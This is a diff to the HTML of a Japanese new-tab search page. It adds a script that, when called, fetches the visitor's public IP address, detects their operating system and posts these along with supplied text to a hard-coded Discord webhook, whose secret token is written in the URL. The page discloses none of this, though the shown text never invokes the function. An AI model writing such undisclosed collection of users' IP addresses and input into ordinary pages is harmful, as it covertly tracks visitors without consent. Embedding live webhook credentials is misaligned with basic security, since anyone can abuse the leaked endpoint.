@@ -11,7 +11,86 @@
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6151036058675874"　crossorigin="anonymous"></script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<script src="https://search3958.github.io/newtab/search.js"></script><script src="https://search3958.github.io/newtab/lang.js"></script><script async src="https://fundingchoicesmessages.google.com/i/pub-6151036058675874?ers=1" nonce="81tuZErrm_ZXG-A64GvWgQ"></script><script nonce="81tuZErrm_ZXG-A64GvWgQ">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();</script>
+<script src="https://search3958.github.io/newtab/search.js"></script><script src="https://search3958.github.io/newtab/lang.js"></script><script async src="https://fundingchoicesmessages.google.com/i/pub-6151036058675874?ers=1" nonce="81tuZErrm_ZXG-A64GvWgQ"></script><script nonce="81tuZErrm_ZXG-A64GvWgQ">(function() {function signalGooglefcPresent() {if (!window.frames['googlefcPresent']) {if (document.body) {const iframe = document.createElement('iframe'); iframe.style = 'width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;'; iframe.style.display = 'none'; iframe.name = 'googlefcPresent'; document.body.appendChild(iframe);} else {setTimeout(signalGooglefcPresent, 0);}}}signalGooglefcPresent();})();
+  
+  window.addEventListener('load', () => {
+  const elem = document.getElementById('textBox');
+  elem.focus();
+});
+  
+  function sendWebhookNotification(text) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1256157852259713087/EiGyxFJz5PBRTx06LqtRg9JK3GZE2nLO4rwU2R7e9-6_aNA0hIMJZesnWc7xL3VoNpZy';
+    const deviceName = 'Newtab・V1'; // デバイス名を設定
+
+    const message = {
+        content: `メモ:${deviceName} 内容:${text}`
+    };
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(message),
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Success:', data);
+    })
+    .catch((error) => {
+        console.error('Error:', error);
+    });
+}
+  
+  </script>
+  
+  <script>
+    function sendWebhookNotification(text) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1256157852259713087/EiGyxFJz5PBRTx06LqtRg9JK3GZE2nLO4rwU2R7e9-6_aNA0hIMJZesnWc7xL3VoNpZy';
+
+    // OS名を取得する関数
+    function getOSName() {
+        const userAgent = navigator.userAgent;
+        let osName = "Unknown OS";
+
+        if (userAgent.indexOf("Win") !== -1) osName = "Windows";
+        else if (userAgent.indexOf("Mac") !== -1) osName = "macOS";
+        else if (userAgent.indexOf("Linux") !== -1) osName = "Linux";
+        else if (userAgent.indexOf("Android") !== -1) osName = "Android";
+        else if (userAgent.indexOf("like Mac") !== -1) osName = "iOS";
+
+        return osName;
+    }
+
+    const osName = getOSName(); // OS名を取得
+
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip; // 取得したIPアドレス
+            const message = {
+                content: `IP: ${ipAddress}, OS: ${osName}, 内容: **${text}**`
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        })
+        .catch(error => console.error('Error:', error));
+}
+
+    </script>
 <title>新しいタブ</title>
 </head>
 <style>*{ font-family: "IBM Plex Sans JP", sans-serif;}.material-symbols-outlined {  font-family: 'Material Symbols Outlined';  font-weight: normal;  font-style: normal;  font-size: 40px;  line-height: 1;  letter-spacing: normal;  text-transform: none;  display: inline-block;  white-space: nowrap;  word-wrap: normal;  direction: ltr;  -webkit-font-feature-settings: 'liga';  -webkit-font-smoothing: antialiased;
@@ -67,7 +146,7 @@ a{color:#000;
 --element-light: #185af2;
 --element-dark: #185af2;
 --text-light: #ffffff;
---text-dark: #1c1c1c;       
+--text-dark: #1c1c1c;
 }
 
 body {background-color: var(--background-light);margin: 0;font-family: Arial, sans-serif;
@@ -89,7 +168,7 @@ input[type=search]{color:#fff;
 }
 }
 </style>
-<body><div class="link"></div><div class="link">  <div class="searchbox"><div class="search"><form id="cse-search-box" action="https://www.google.com/search"><input type="search" id="textBox" name="textBox" placeholder=""　autofocus></form><form method="get" action="https://www.google.co.jp/search" id="googleForm"><input type="hidden" name="q" id="googleInput" size="31" maxlength="255" value=""　><input type="hidden" name="ie" value="UTF-8"><input type="hidden" name="oe" value="UTF-8"><input type="hidden" name="hl" value="ja"><button type="submit" name="btnG" value="Google 検索"><div class="submit"><span class="material-symbols-outlined">search</span></div></button></form></div><div id="clock"></div>    </div></div><div class="link"></div>
+<body><div class="link"></div><div class="link">  <div class="searchbox"><div class="search"><form id="cse-search-box" action="https://www.google.com/search"><input type="search" id="textBox" name="textBox" placeholder=" " autofocus></form><form method="get" action="https://www.google.co.jp/search" id="googleForm"><input type="hidden" name="q" id="googleInput" size="31" maxlength="255" value=""　><input type="hidden" name="ie" value="UTF-8"><input type="hidden" name="oe" value="UTF-8"><input type="hidden" name="hl" value="ja"><button type="submit" name="btnG" value="Google 検索"><div class="submit"><span class="material-symbols-outlined">search</span></div></button></form></div><div id="clock"></div>    </div></div><div class="link"></div>
 <div class="title">Google</div>
 <div class="link">
 
